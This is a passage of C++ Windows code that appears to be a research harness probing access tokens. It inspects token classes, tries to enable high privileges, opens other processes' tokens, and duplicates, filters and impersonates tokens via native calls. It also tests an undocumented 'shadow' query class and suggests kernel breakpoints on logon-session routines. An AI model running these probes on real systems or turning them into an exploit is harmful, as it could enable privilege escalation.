            << " attrs=" << hex_u32(mandatory->Label.Attributes)
            << " " << sid_summary(mandatory->Label.Sid);
    }
    log_line(oss.str());
}

void log_token_mandatory_policy_info(HANDLE token, const std::string &label) {
    LocalTokenMandatoryPolicy policy = {};
    DWORD ret = 0;
    SetLastError(ERROR_SUCCESS);
    bool ok = get_token_info_fixed(token, static_cast<TOKEN_INFORMATION_CLASS>(27), &policy, sizeof(policy), &ret);
    DWORD gle = ok ? ERROR_SUCCESS : GetLastError();
    std::ostringstream oss;
    oss << label << " ok=" << yes_no(ok)
        << " policy=" << hex_u32(policy.Policy)
        << " gle=" << gle
        << " retLen=" << ret;
    log_line(oss.str());
}

void log_token_appcontainer_sid_info(HANDLE token, const std::string &label) {
    std::vector<BYTE> buf;
    DWORD gle = 0;
    DWORD ret = 0;
    bool ok = get_token_info_variable(token, static_cast<TOKEN_INFORMATION_CLASS>(31), &buf, &gle, &ret);
    std::ostringstream oss;
    oss << label << " ok=" << yes_no(ok) << " gle=" << gle << " retLen=" << ret;
    if (ok && !buf.empty()) {
        const LocalTokenAppContainerInformation *info = reinterpret_cast<const LocalTokenAppContainerInformation *>(buf.data());
        oss << " " << sid_summary(info->TokenAppContainer);
    }
    log_line(oss.str());
}

void inspect_token_deep(HANDLE token, const std::string &label) {
    log_line(label + " begin");
    log_token_user_like_info(token, static_cast<TOKEN_INFORMATION_CLASS>(1), label + " TokenUser");
    log_token_owner_info(token, label + " TokenOwner");
    log_token_groups_info(token, static_cast<TOKEN_INFORMATION_CLASS>(2), label + " TokenGroups");
    log_token_groups_info(token, static_cast<TOKEN_INFORMATION_CLASS>(11), label + " TokenRestrictedSids");
    log_token_dword_info(token, static_cast<TOKEN_INFORMATION_CLASS>(12), label + " TokenSessionId");
    log_token_source_info(token, label + " TokenSource");
    log_token_origin_info(token, label + " TokenOrigin");
    log_token_dword_info(token, static_cast<TOKEN_INFORMATION_CLASS>(21), label + " TokenHasRestrictions");
    log_token_dword_info(token, static_cast<TOKEN_INFORMATION_CLASS>(23), label + " TokenVirtualizationAllowed");
    log_token_dword_info(token, static_cast<TOKEN_INFORMATION_CLASS>(24), label + " TokenVirtualizationEnabled");
    log_token_integrity_info(token, label + " TokenIntegrityLevel");
    log_token_dword_info(token, static_cast<TOKEN_INFORMATION_CLASS>(26), label + " TokenUIAccess");
    log_token_mandatory_policy_info(token, label + " TokenMandatoryPolicy");
    log_token_groups_info(token, static_cast<TOKEN_INFORMATION_CLASS>(28), label + " TokenLogonSid");
    log_token_dword_info(token, static_cast<TOKEN_INFORMATION_CLASS>(29), label + " TokenIsAppContainer");
    log_token_groups_info(token, static_cast<TOKEN_INFORMATION_CLASS>(30), label + " TokenCapabilities");
    log_token_appcontainer_sid_info(token, label + " TokenAppContainerSid");
    log_token_dword_info(token, static_cast<TOKEN_INFORMATION_CLASS>(32), label + " TokenAppContainerNumber");
    log_token_dword_info(token, static_cast<TOKEN_INFORMATION_CLASS>(40), label + " TokenIsRestricted");
    log_line(label + " end");
}

struct TokenRelationSnapshot {
    std::string label;
    HANDLE handle = nullptr;
    bool stats_ok = false;
    bool type_ok = false;
    bool elevation_type_ok = false;
    bool elevation_ok = false;
    bool integrity_ok = false;
    bool has_restrictions_ok = false;
    bool restricted_count_ok = false;
    bool group_count_ok = false;
    bool logon_sid_count_ok = false;
    TOKEN_STATISTICS stats = {};
    TOKEN_TYPE type = TokenPrimary;
    TOKEN_ELEVATION_TYPE elevation_type = TokenElevationTypeDefault;
    DWORD elevated = 0;
    DWORD integrity_rid = 0;
    DWORD integrity_attrs = 0;
    DWORD has_restrictions = 0;
    DWORD restricted_sid_count = 0;
    DWORD group_count = 0;
    DWORD deny_only_group_count = 0;
    DWORD logon_sid_count = 0;
    DWORD snapshot_gle = ERROR_SUCCESS;
};

bool luid_equal(const LUID &a, const LUID &b) {
    return a.LowPart == b.LowPart && a.HighPart == b.HighPart;
}

bool capture_group_count(HANDLE token,
                         TOKEN_INFORMATION_CLASS cls,
                         DWORD *count,
                         DWORD *deny_only_count = nullptr) {
    if (count == nullptr) {
        return false;
    }
    *count = 0;
    if (deny_only_count != nullptr) {
        *deny_only_count = 0;
    }

    std::vector<BYTE> buf;
    DWORD gle = 0;
    DWORD ret = 0;
    bool ok = get_token_info_variable(token, cls, &buf, &gle, &ret);
    if (!ok || buf.empty()) {
        return false;
    }
    const TOKEN_GROUPS *groups = reinterpret_cast<const TOKEN_GROUPS *>(buf.data());
    *count = groups->GroupCount;
    if (deny_only_count != nullptr) {
        DWORD deny_only = 0;
        for (DWORD i = 0; i < groups->GroupCount; ++i) {
            if ((groups->Groups[i].Attributes & SE_GROUP_USE_FOR_DENY_ONLY) != 0) {
                ++deny_only;
            }
        }
        *deny_only_count = deny_only;
    }
    return true;
}

bool capture_integrity_rid(HANDLE token, DWORD *rid, DWORD *attrs) {
    if (rid == nullptr || attrs == nullptr) {
        return false;
    }
    *rid = 0;
    *attrs = 0;
    std::vector<BYTE> buf;
    DWORD gle = 0;
    DWORD ret = 0;
    bool ok = get_token_info_variable(token, static_cast<TOKEN_INFORMATION_CLASS>(25), &buf, &gle, &ret);
    if (!ok || buf.empty()) {
        return false;
    }
    const LocalTokenMandatoryLabel *mandatory = reinterpret_cast<const LocalTokenMandatoryLabel *>(buf.data());
    *attrs = mandatory->Label.Attributes;
    if (mandatory->Label.Sid == nullptr || !IsValidSid(mandatory->Label.Sid)) {
        return false;
    }
    UCHAR count = *GetSidSubAuthorityCount(mandatory->Label.Sid);
    if (count == 0) {
        return false;
    }
    *rid = *GetSidSubAuthority(mandatory->Label.Sid, static_cast<DWORD>(count - 1));
    return true;
}

TokenRelationSnapshot capture_token_relation_snapshot(HANDLE token,
                                                      const std::string &label,
                                                      bool include_group_counts) {
    TokenRelationSnapshot snap;
    snap.label = label;
    snap.handle = token;
    if (token == nullptr || token == INVALID_HANDLE_VALUE) {
        snap.snapshot_gle = ERROR_INVALID_HANDLE;
        return snap;
    }

    DWORD ret = 0;
    SetLastError(ERROR_SUCCESS);
    snap.stats_ok = get_token_info_fixed(token, TokenStatistics, &snap.stats, sizeof(snap.stats), &ret);
    if (!snap.stats_ok) {
        snap.snapshot_gle = GetLastError();
    }
    SetLastError(ERROR_SUCCESS);
    snap.type_ok = get_token_info_fixed(token, TokenType, &snap.type, sizeof(snap.type), &ret);
    SetLastError(ERROR_SUCCESS);
    snap.elevation_type_ok = get_token_info_fixed(token, TokenElevationType, &snap.elevation_type, sizeof(snap.elevation_type), &ret);
    TOKEN_ELEVATION elevation = {};
    SetLastError(ERROR_SUCCESS);
    snap.elevation_ok = get_token_info_fixed(token, TokenElevation, &elevation, sizeof(elevation), &ret);
    snap.elevated = elevation.TokenIsElevated;
    snap.integrity_ok = capture_integrity_rid(token, &snap.integrity_rid, &snap.integrity_attrs);
    SetLastError(ERROR_SUCCESS);
    snap.has_restrictions_ok = get_token_info_fixed(token,
                                                    static_cast<TOKEN_INFORMATION_CLASS>(21),
                                                    &snap.has_restrictions,
                                                    sizeof(snap.has_restrictions),
                                                    &ret);
    if (include_group_counts) {
        snap.group_count_ok = capture_group_count(token,
                                                  static_cast<TOKEN_INFORMATION_CLASS>(2),
                                                  &snap.group_count,
                                                  &snap.deny_only_group_count);
        snap.restricted_count_ok = capture_group_count(token,
                                                       static_cast<TOKEN_INFORMATION_CLASS>(11),
                                                       &snap.restricted_sid_count,
                                                       nullptr);
        snap.logon_sid_count_ok = capture_group_count(token,
                                                      static_cast<TOKEN_INFORMATION_CLASS>(28),
                                                      &snap.logon_sid_count,
                                                      nullptr);
    }
    return snap;
}

std::string relation_snapshot_summary(const TokenRelationSnapshot &s) {
    std::ostringstream oss;
    oss << "[Relation.Snapshot] " << s.label
        << " handle=" << hex_ptr(s.handle)
        << " stats_ok=" << yes_no(s.stats_ok);
    if (s.stats_ok) {
        oss << " auth=" << luid_to_string(s.stats.AuthenticationId)
            << " token_id=" << luid_to_string(s.stats.TokenId)
            << " modified=" << luid_to_string(s.stats.ModifiedId);
    } else {
        oss << " gle=" << s.snapshot_gle;
    }
    oss << " type=" << (s.type_ok ? token_type_to_string(s.type) : "unavailable")
        << " elevation_type=" << (s.elevation_type_ok ? elevation_type_to_string(s.elevation_type) : "unavailable")
        << " elevated=" << (s.elevation_ok ? yes_no(s.elevated != 0) : "unavailable")
        << " integrity=";
    if (s.integrity_ok) {
        oss << integrity_rid_to_string(s.integrity_rid) << "/" << hex_u32(s.integrity_rid);
    } else {
        oss << "unavailable";
    }
    oss << " has_restrictions=" << (s.has_restrictions_ok ? yes_no(s.has_restrictions != 0) : "unavailable");
    if (s.group_count_ok) {
        oss << " groups=" << s.group_count << " deny_only=" << s.deny_only_group_count;
    }
    if (s.restricted_count_ok) {
        oss << " restricted_sids=" << s.restricted_sid_count;
    }
    if (s.logon_sid_count_ok) {
        oss << " logon_sids=" << s.logon_sid_count;
    }
    return oss.str();
}

void log_relation_snapshot(const TokenRelationSnapshot &s, bool dbg) {
    log_line(relation_snapshot_summary(s), dbg);
}

bool compare_token_relation(const TokenRelationSnapshot &base,
                            const TokenRelationSnapshot &other,
                            const std::string &relation_label,
                            bool loud) {
    bool comparable = base.stats_ok && other.stats_ok;
    bool auth_equal = comparable && luid_equal(base.stats.AuthenticationId, other.stats.AuthenticationId);
    bool token_equal = comparable && luid_equal(base.stats.TokenId, other.stats.TokenId);
    bool modified_equal = comparable && luid_equal(base.stats.ModifiedId, other.stats.ModifiedId);
    bool integrity_equal = base.integrity_ok && other.integrity_ok && base.integrity_rid == other.integrity_rid;
    bool restriction_equal = base.has_restrictions_ok && other.has_restrictions_ok &&
                             base.has_restrictions == other.has_restrictions;
    bool restricted_count_equal = base.restricted_count_ok && other.restricted_count_ok &&
                                  base.restricted_sid_count == other.restricted_sid_count;

    std::ostringstream oss;
    oss << "[Relation.Compare] " << relation_label
        << " base=" << base.label
        << " other=" << other.label
        << " auth_equal=" << yes_no(auth_equal)
        << " token_id_equal=" << yes_no(token_equal)
        << " modified_equal=" << yes_no(modified_equal)
        << " integrity_equal=" << (base.integrity_ok && other.integrity_ok ? yes_no(integrity_equal) : "unavailable")
        << " restrictions_equal=" << (base.has_restrictions_ok && other.has_restrictions_ok ? yes_no(restriction_equal) : "unavailable")
        << " restricted_count_equal=" << (base.restricted_count_ok && other.restricted_count_ok ? yes_no(restricted_count_equal) : "unavailable");
    if (base.integrity_ok && other.integrity_ok) {
        oss << " integrity_delta=" << static_cast<int64_t>(other.integrity_rid) - static_cast<int64_t>(base.integrity_rid);
    }
    if (base.restricted_count_ok && other.restricted_count_ok) {
        oss << " restricted_delta=" << static_cast<int64_t>(other.restricted_sid_count) - static_cast<int64_t>(base.restricted_sid_count);
    }
    bool interesting = comparable && (!auth_equal || token_equal);
    if (loud || interesting) {
        log_line(oss.str(), loud || interesting);
    } else {
        dbg_line(oss.str());
    }
    return comparable;
}

bool token_has_privilege(HANDLE token, const LUID &luid) {
    DWORD needed = 0;
    GetTokenInformation(token, TokenPrivileges, nullptr, 0, &needed);
    if (needed == 0) {
        return false;
    }
    std::vector<BYTE> buf(needed);
    if (!GetTokenInformation(token, TokenPrivileges, buf.data(), static_cast<DWORD>(buf.size()), &needed)) {
        return false;
    }
    const TOKEN_PRIVILEGES *privs = reinterpret_cast<const TOKEN_PRIVILEGES *>(buf.data());
    for (DWORD i = 0; i < privs->PrivilegeCount; ++i) {
        const LUID &cur = privs->Privileges[i].Luid;
        if (cur.LowPart == luid.LowPart && cur.HighPart == luid.HighPart) {
            return true;
        }
    }
    return false;
}

struct PrivilegeEnableResult {
    bool enable_call = false;
    DWORD gle = ERROR_SUCCESS;
    bool not_all_assigned = false;
};

PrivilegeEnableResult try_enable_privilege(HANDLE token, const LUID &luid) {
    PrivilegeEnableResult result;
    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    SetLastError(ERROR_SUCCESS);
    result.enable_call = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), nullptr, nullptr) != FALSE;
    result.gle = GetLastError();
    result.not_all_assigned = (result.gle == ERROR_NOT_ALL_ASSIGNED);
    return result;
}

void inspect_privilege(HANDLE token, const wchar_t *priv_name) {
    LUID luid = {};
    bool lookup_ok = LookupPrivilegeValueW(nullptr, priv_name, &luid) != FALSE;
    bool present = false;
    PrivilegeEnableResult enable = {};

    if (lookup_ok) {
        present = token_has_privilege(token, luid);
        enable = try_enable_privilege(token, luid);
    } else {
        enable.gle = GetLastError();
    }

    std::ostringstream oss;
    oss << "[priv] " << narrow(priv_name)
        << " present=" << (present ? "yes" : "no")
        << " enable_call=" << (enable.enable_call ? "yes" : "no")
        << " gle=" << enable.gle
        << " not_all_assigned=" << (enable.not_all_assigned ? "yes" : "no");
    if (!lookup_ok) {
        oss << " lookup=no";
    }
    log_line(oss.str());
}

unique_handle open_current_token() {
    HANDLE h = nullptr;
    DWORD desired = TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_DEFAULT;
    if (OpenProcessToken(GetCurrentProcess(), desired, &h)) {
        log_line("[token] OpenProcessToken full access succeeded handle=" + hex_ptr(h));
        return unique_handle(h);
    }
    DWORD gle1 = GetLastError();
    h = nullptr;
    DWORD fallback = TOKEN_QUERY | TOKEN_DUPLICATE;
    if (OpenProcessToken(GetCurrentProcess(), fallback, &h)) {
        log_line("[token] OpenProcessToken degraded access succeeded full_gle=" + std::to_string(gle1) +
                 " handle=" + hex_ptr(h));
        return unique_handle(h);
    }
    log_line("[token] ERROR OpenProcessToken failed full_gle=" + std::to_string(gle1) +
             " fallback_gle=" + std::to_string(GetLastError()));
    return unique_handle();
}

unique_handle open_target_token(DWORD pid) {
    if (pid == 0) {
        return unique_handle();
    }
    unique_handle process(OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid));
    if (!process) {
        DWORD gle1 = GetLastError();
        process.reset(OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid));
        if (!process) {
            log_line("[target] OpenProcess pid=" + std::to_string(pid) + " failed gle1=" + std::to_string(gle1) +
                     " gle2=" + std::to_string(GetLastError()));
            return unique_handle();
        }
    }

    HANDLE token = nullptr;
    if (OpenProcessToken(process.get(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &token)) {
        log_line("[target] OpenProcessToken pid=" + std::to_string(pid) + " succeeded handle=" + hex_ptr(token));
        return unique_handle(token);
    }
    log_line("[target] OpenProcessToken pid=" + std::to_string(pid) + " failed gle=" + std::to_string(GetLastError()));
    return unique_handle();
}

unique_handle open_target_token_quiet(DWORD pid) {
    if (pid == 0) {
        return unique_handle();
    }

    unique_handle process(OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid));
    if (!process) {
        process.reset(OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid));
        if (!process) {
            return unique_handle();
        }
    }

    HANDLE token = nullptr;
    if (OpenProcessToken(process.get(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &token)) {
        return unique_handle(token);
    }
    return unique_handle();
}

void query_rtl_elevation_flags() {
    if (g_nt.RtlQueryElevationFlags == nullptr) {
        log_line("[rtl] RtlQueryElevationFlags unavailable");
        return;
    }
    ULONG flags = 0;
    NTSTATUS st = g_nt.RtlQueryElevationFlags(&flags);
    std::ostringstream oss;
    oss << "[rtl] RtlQueryElevationFlags status=" << format_status(st)
        << " flags=" << hex_u32(flags)
        << " shadow_gate_match=" << (((flags & 0x18UL) == 0x10UL) ? "yes" : "no");
    log_line(oss.str());
}

void inspect_current_token(HANDLE token) {
    inspect_token_basic(token, "[token.current]");
    inspect_token_deep(token, "[token.current.deep]");
    inspect_linked_token_win32(token);
    inspect_privilege(token, SE_DEBUG_NAME);
    inspect_privilege(token, SE_CREATE_TOKEN_NAME);
    inspect_privilege(token, SE_TCB_NAME);
    query_rtl_elevation_flags();
}

void emit_kd_breadcrumbs(HANDLE current_token, HANDLE target_token, const Config &cfg) {
    LARGE_INTEGER qpc = {};
    LARGE_INTEGER freq = {};
    QueryPerformanceCounter(&qpc);
    QueryPerformanceFrequency(&freq);
    std::ostringstream oss;
    oss << "[kd] utc=" << utc_timestamp()
        << " tick=" << GetTickCount64()
        << " qpc=" << qpc.QuadPart
        << " qpf=" << freq.QuadPart
        << " pid=" << GetCurrentProcessId()
        << " tid=" << GetCurrentThreadId()
        << " currentToken=" << hex_ptr(current_token)
        << " targetToken=" << hex_ptr(target_token)
        << " mode=" << mode_to_string(cfg.mode)
        << " threads=" << cfg.threads
        << " seconds=" << cfg.seconds;
    log_line(oss.str(), true);
    kd_breadcrumb("main-token-context", current_token, target_token, STATUS_SUCCESS, true);
    dbg_line("[kd] Suggested breakpoints: nt!NtQueryInformationToken nt!NtSetInformationToken nt!SepDuplicateToken nt!SepTokenDeleteMethod nt!SepDeReferenceLogonSession");
    dbg_line("[kd] This program does not read kernel addresses; inspect _TOKEN.LogonSession and _SEP_LOGON_SESSION_REFERENCES manually in the debugger.");
}

NTSTATUS query_token_class_once(HANDLE token,
                                TOKEN_INFORMATION_CLASS cls,
                                const std::string &label,
                                bool inspect_returned,
                                Stats *stats,
                                OpCounters *counter,
                                bool loud) {
    HANDLE out = nullptr;
    ULONG ret_len = 0;
    NTSTATUS st = g_nt.NtQueryInformationToken(token, cls, &out, sizeof(out), &ret_len);
    record_status(stats, st);
    bool ok = NT_SUCCESS(st);
    record_op(counter, ok);
    if (stats != nullptr) {
        stats->total_ops.fetch_add(1, std::memory_order_relaxed);
    }

    std::ostringstream status_oss;
    status_oss << "[" << label << "] status=" << format_status(st);
    if (ok) {
        status_oss << " returned=" << hex_ptr(out);
    } else {
        status_oss << " retLen=" << ret_len;
    }

    if (loud) {
        log_line(status_oss.str(), ok);
    } else if (ok && cls == static_cast<TOKEN_INFORMATION_CLASS>(-2)) {
        log_line(status_oss.str(), true);
    } else if (ok) {
        dbg_line(status_oss.str());
    } else if (!is_common_gate_status(st)) {
        dbg_line("[unexpected-status] " + status_oss.str());
    }

    if (ok) {
        if (out != nullptr) {
            unique_handle returned(out);
            if (cls == static_cast<TOKEN_INFORMATION_CLASS>(19)) {
                if (loud) {
                    log_line("[Query(19)] CONFIRMED returned handle", true);
                } else {
                    dbg_line("[Query(19)] CONFIRMED returned handle");
                }
            } else {
                log_line("[Query(-2)] CONFIRMED_UNEXPECTED returned handle", true);
            }
            if (inspect_returned) {
                inspect_token_basic(returned.get(), "[" + label + ".returned]", loud);
            }
        } else {
            log_line("[" + label + "] ANOMALY success with null returned handle", true);
        }
    }
    return st;
}

NTSTATUS query_token_class_len_once(HANDLE token,
                                    TOKEN_INFORMATION_CLASS cls,
                                    const std::string &label,
                                    ULONG buffer_len,
                                    bool null_buffer,
                                    bool inspect_returned,
                                    Stats *stats,
                                    OpCounters *counter,
                                    bool loud) {
    struct HandleProbeBuffer {
        HANDLE out;
        ULONG_PTR guard0;
        ULONG_PTR guard1;
        ULONG_PTR guard2;
    };

    HandleProbeBuffer buf = {};
    ULONG capped_len = std::min<ULONG>(buffer_len, static_cast<ULONG>(sizeof(buf)));
    ULONG ret_len = 0;
    PVOID probe_ptr = null_buffer ? nullptr : &buf;
    NTSTATUS st = g_nt.NtQueryInformationToken(token, cls, probe_ptr, capped_len, &ret_len);
    record_status(stats, st);
    bool ok = NT_SUCCESS(st);
    record_op(counter, ok);
    if (stats != nullptr) {
        stats->total_ops.fetch_add(1, std::memory_order_relaxed);
    }

    bool full_handle_buffer = !null_buffer && capped_len >= sizeof(HANDLE);
    std::ostringstream status_oss;
    status_oss << "[" << label << ".len] len=" << capped_len
               << " nullbuf=" << yes_no(null_buffer)
               << " status=" << format_status(st)
               << " retLen=" << ret_len;
    if (full_handle_buffer) {
        status_oss << " returned=" << hex_ptr(buf.out);
    }
    if (buf.guard0 != 0 || buf.guard1 != 0 || buf.guard2 != 0) {
        status_oss << " guard_changed=yes";
    }

    bool is_shadow = (cls == static_cast<TOKEN_INFORMATION_CLASS>(-2));
    bool odd_success = ok && (null_buffer || capped_len != sizeof(HANDLE) || buf.out == nullptr);
    bool guard_changed = (buf.guard0 != 0 || buf.guard1 != 0 || buf.guard2 != 0);
    bool interesting = (ok && (is_shadow || odd_success)) || !is_common_gate_status(st) || guard_changed;
    if (loud || interesting) {
        log_line(status_oss.str(), interesting);
    } else if (ok) {
        dbg_line(status_oss.str());
    }

    if (ok) {
        if (full_handle_buffer && buf.out != nullptr) {
            unique_handle returned(buf.out);
            log_line("[" + label + ".len] CONFIRMED returned handle; closed immediately", true);
            if (inspect_returned) {
                inspect_token_basic(returned.get(), "[" + label + ".len.returned]", loud);
            }
        } else if (!full_handle_buffer) {
            log_line("[" + label + ".len] success without full handle-sized output buffer", true);
        } else {
            log_line("[" + label + ".len] ANOMALY success with null returned handle", true);
        }
    }
    return st;
}

NTSTATUS duplicate_token_variant_once(HANDLE token,
                                      bool effective_only,
                                      TOKEN_TYPE token_type,
                                      SECURITY_IMPERSONATION_LEVEL level,
                                      ACCESS_MASK desired_access,
                                      const std::string &label,
                                      bool inspect_returned,
                                      Stats *stats,
                                      bool loud);

NTSTATUS duplicate_token_once(HANDLE token,
                              bool effective_only,
                              bool inspect_returned,
                              Stats *stats,
                              bool loud) {
    return duplicate_token_variant_once(token,
                                        effective_only,
                                        TokenImpersonation,
                                        SecurityImpersonation,
                                        TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                                        "Duplicate",
                                        inspect_returned,
                                        stats,
                                        loud);
}

NTSTATUS duplicate_token_variant_once(HANDLE token,
                                      bool effective_only,
                                      TOKEN_TYPE token_type,
                                      SECURITY_IMPERSONATION_LEVEL level,
                                      ACCESS_MASK desired_access,
                                      const std::string &label,
                                      bool inspect_returned,
                                      Stats *stats,
                                      bool loud) {
    SECURITY_QUALITY_OF_SERVICE sqos = {};
    sqos.Length = sizeof(sqos);
    sqos.ImpersonationLevel = level;
    sqos.ContextTrackingMode = static_cast<SECURITY_CONTEXT_TRACKING_MODE>(SECURITY_DYNAMIC_TRACKING);
    sqos.EffectiveOnly = static_cast<BOOLEAN>(FALSE);

    OBJECT_ATTRIBUTES oa = {};
    oa.Length = sizeof(oa);
    oa.SecurityQualityOfService = &sqos;

    HANDLE out = nullptr;
    NTSTATUS st = g_nt.NtDuplicateToken(token,
                                        desired_access,
                                        &oa,
                                        static_cast<BOOLEAN>(effective_only ? TRUE : FALSE),
                                        token_type,
                                        &out);
    record_status(stats, st);
    bool ok = NT_SUCCESS(st);
    record_op(stats == nullptr ? nullptr : &stats->dup, ok);
    if (stats != nullptr) {
        stats->total_ops.fetch_add(1, std::memory_order_relaxed);
    }

    std::ostringstream status_oss;
    status_oss << "[" << label << "] type=" << token_type_to_string(token_type)
               << " level=" << impersonation_level_to_string(level)
               << " effectiveOnly=" << (effective_only ? "true" : "false")
               << " desired=" << hex_u32(static_cast<uint32_t>(desired_access))
               << " status=" << format_status(st);
    if (ok) {
        status_oss << " returned=" << hex_ptr(out);
    }
    if (loud) {
        log_line(status_oss.str(), ok);
    } else if (ok) {
        dbg_line(status_oss.str());
    } else if (!is_common_gate_status(st)) {
        dbg_line("[unexpected-status] " + status_oss.str());
    }

    if (ok) {
        if (out != nullptr) {
            unique_handle returned(out);
            if (inspect_returned) {
                inspect_token_basic(returned.get(), "[" + label + ".returned]", loud);
            }
        } else {
            log_line("[" + label + "] ANOMALY success with null returned handle", true);
        }
    }
    return st;
}

bool self_impersonation_once(HANDLE token, bool effective_only, Stats *stats, bool loud) {
    SECURITY_QUALITY_OF_SERVICE sqos = {};
    sqos.Length = sizeof(sqos);
    sqos.ImpersonationLevel = SecurityImpersonation;
    sqos.ContextTrackingMode = static_cast<SECURITY_CONTEXT_TRACKING_MODE>(SECURITY_DYNAMIC_TRACKING);
    sqos.EffectiveOnly = static_cast<BOOLEAN>(FALSE);

    OBJECT_ATTRIBUTES oa = {};
    oa.Length = sizeof(oa);
    oa.SecurityQualityOfService = &sqos;

    HANDLE raw_dup = nullptr;
    NTSTATUS st = g_nt.NtDuplicateToken(token,
                                        TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                                        &oa,
                                        static_cast<BOOLEAN>(effective_only ? TRUE : FALSE),
                                        TokenImpersonation,
                                        &raw_dup);
    record_status(stats, st);

    bool ok = false;
    DWORD set_gle = ERROR_SUCCESS;
    DWORD open_thread_gle = ERROR_SUCCESS;
    DWORD revert_gle = ERROR_SUCCESS;
    unique_handle dup(raw_dup);
    if (NT_SUCCESS(st) && dup) {
        SetLastError(ERROR_SUCCESS);
        BOOL set_ok = SetThreadToken(nullptr, dup.get());
        set_gle = set_ok ? ERROR_SUCCESS : GetLastError();
        if (set_ok) {
            HANDLE raw_thread_token = nullptr;
            SetLastError(ERROR_SUCCESS);
            BOOL open_ok = OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_DUPLICATE, TRUE, &raw_thread_token);
            open_thread_gle = open_ok ? ERROR_SUCCESS : GetLastError();
            unique_handle thread_token(raw_thread_token);
            if (open_ok && loud) {
                inspect_token_basic(thread_token.get(), "[SelfImpersonate.thread]", true);
            }

            SetLastError(ERROR_SUCCESS);
            BOOL revert_ok = RevertToSelf();
            revert_gle = revert_ok ? ERROR_SUCCESS : GetLastError();
            if (!revert_ok) {
                SetThreadToken(nullptr, nullptr);
            }
            ok = revert_ok != FALSE;
        }
    }

    record_op(stats == nullptr ? nullptr : &stats->impersonate, ok);
    if (stats != nullptr) {
        stats->total_ops.fetch_add(1, std::memory_order_relaxed);
    }

    std::ostringstream oss;
    oss << "[SelfImpersonate] effectiveOnly=" << yes_no(effective_only)
        << " duplicate=" << format_status(st)
        << " set_gle=" << set_gle
        << " open_thread_gle=" << open_thread_gle
        << " revert_gle=" << revert_gle
        << " ok=" << yes_no(ok);
    if (loud) {
        log_line(oss.str(), ok);
    } else if (ok) {
        dbg_line(oss.str());
    } else if (!is_common_gate_status(st) || set_gle != ERROR_SUCCESS || revert_gle != ERROR_SUCCESS) {
        dbg_line("[unexpected-self-impersonate] " + oss.str());
    }
    return ok;
}

NTSTATUS filter_token_variant_once(HANDLE token, ULONG flags, const std::string &label, bool inspect_returned, Stats *stats, bool loud) {
    HANDLE out = nullptr;
    NTSTATUS st = g_nt.NtFilterToken(token, flags, nullptr, nullptr, nullptr, &out);
    record_status(stats, st);
    bool ok = NT_SUCCESS(st);
    record_op(stats == nullptr ? nullptr : &stats->filter, ok);
    if (stats != nullptr) {
        stats->total_ops.fetch_add(1, std::memory_order_relaxed);
    }

    std::ostringstream status_oss;
    status_oss << "[" << label << "] flags=" << hex_u32(flags) << " status=" << format_status(st);
    if (ok) {
        status_oss << " returned=" << hex_ptr(out);
    }
    if (loud) {
        log_line(status_oss.str(), ok);
    } else if (ok) {
        dbg_line(status_oss.str());
    } else if (!is_common_gate_status(st)) {
        dbg_line("[unexpected-status] " + status_oss.str());
    }

    if (ok) {
        if (out != nullptr) {
            unique_handle returned(out);
            if (inspect_returned) {
                inspect_token_basic(returned.get(), "[" + label + ".returned]", loud);
            }
        } else {
            log_line("[" + label + "] ANOMALY success with null returned handle", true);
        }
    }
    return st;
}

NTSTATUS filter_token_once(HANDLE token, bool inspect_returned, Stats *stats, bool loud) {
    return filter_token_variant_once(token, DISABLE_MAX_PRIVILEGE, "Filter", inspect_returned, stats, loud);
}

unique_handle query_linked_token_handle_for_relation(HANDLE token, const std::string &label, Stats *stats, bool loud) {
    HANDLE out = nullptr;
    ULONG ret_len = 0;
    TOKEN_INFORMATION_CLASS cls = static_cast<TOKEN_INFORMATION_CLASS>(19);
    NTSTATUS st = g_nt.NtQueryInformationToken(token, cls, &out, sizeof(out), &ret_len);
    record_status(stats, st);

    std::ostringstream oss;
    oss << "[Relation.Handle] " << label
        << " op=QueryLinked status=" << format_status(st)
        << " retLen=" << ret_len
        << " returned=" << hex_ptr(out);
    if (loud || !is_common_gate_status(st)) {
        log_line(oss.str(), NT_SUCCESS(st) || !is_common_gate_status(st));
    } else if (NT_SUCCESS(st)) {
        dbg_line(oss.str());
    }
    kd_breadcrumb("relation-query-linked", token, out, st, loud);
    if (NT_SUCCESS(st) && out != nullptr) {
        return unique_handle(out);
    }
    if (out != nullptr) {
        CloseHandle(out);
    }
    return unique_handle();
}

unique_handle duplicate_token_handle_for_relation(HANDLE token,
                                                 bool effective_only,
                                                 TOKEN_TYPE token_type,
                                                 SECURITY_IMPERSONATION_LEVEL level,
                                                 ACCESS_MASK desired_access,
                                                 const std::string &label,
                                                 Stats *stats,
                                                 bool loud) {
    SECURITY_QUALITY_OF_SERVICE sqos = {};
    sqos.Length = sizeof(sqos);
    sqos.ImpersonationLevel = level;
    sqos.ContextTrackingMode = static_cast<SECURITY_CONTEXT_TRACKING_MODE>(SECURITY_DYNAMIC_TRACKING);
    sqos.EffectiveOnly = static_cast<BOOLEAN>(FALSE);

    OBJECT_ATTRIBUTES oa = {};
    oa.Length = sizeof(oa);
    oa.SecurityQualityOfService = &sqos;

    HANDLE out = nullptr;
    NTSTATUS st = g_nt.NtDuplicateToken(token,
                                        desired_access,
                                        &oa,
                                        static_cast<BOOLEAN>(effective_only ? TRUE : FALSE),
                                        token_type,
                                        &out);
    record_status(stats, st);

    std::ostringstream oss;
    oss << "[Relation.Handle] " << label
        << " op=Duplicate"
        << " type=" << token_type_to_string(token_type)
        << " level=" << impersonation_level_to_string(level)
        << " effectiveOnly=" << yes_no(effective_only)
        << " status=" << format_status(st)
